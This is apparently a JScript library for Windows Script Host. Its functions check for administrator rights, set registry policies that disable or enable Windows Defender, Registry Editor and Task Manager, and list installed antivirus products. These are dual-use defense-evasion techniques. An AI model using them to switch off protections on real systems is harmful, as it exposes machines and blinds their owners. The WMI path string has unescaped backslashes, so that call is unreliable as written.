////////////////////////////////////////////////////////////////////////
// Security API
////////////////////////////////////////////////////////////////////////

var REG = require("lib/registry");
var WSH = CreateObject("WScript.Shell");

exports.VERSIONINFO = "Security Lib (security.js) version 0.1";
exports.global = global;
exports.require = global.require;

exports.DISABLED = 0x00000001;
exports.ENABLED = 0x00000000;

// check 'run as administrator'
exports.isElevated = function() {
    try {
        WSH.RegRead("HKEY_USERS\\s-1-5-19\\");
        return true;
    } catch (e) {
        return false;
    }
};

// turn on/off Windows Defender
exports.setAntiSpyware = function(buffer) {
    var path = "SOFTWARE\\Policies\\Microsoft\\Windows Defender";
    var key = "DisableAntiSpyware";
    REG.write(REG.HKLM, path, key, buffer, REG.DWORD);
};

// trun on/off Registry Editor (regedit)
exports.setRegedit = function(buffer) {
    var path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    var key = "DisableRegistryTools";
    REG.write(REG.HKLM, path, key, buffer, REG.DWORD);
};

// turn on/off Task Manager (taskmgr)
exports.setTaskmgr = function(buffer) {
    var path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    var key = "DisableTaskMgr";
    REG.write(REG.HKLM, path, key, buffer, REG.DWORD);
};

// detect antivirus from security center
exports.detectAntivirus = function() {
    var displayNames = [];

    var objWMIService = GetObject("winmgmts:\\.\root\SecurityCenter2");
    var colItems = objWMIService.ExecQuery("SELECT * FROM AntiVirusProduct");
    var enumItems = new Enumerator(colItems);
    for (; !enumItems.atEnd(); enumItems.moveNext()) {
        var objItem = enumItems.item();
        displayNames.push(objItem.displayName);
    }

    return displayNames;
};
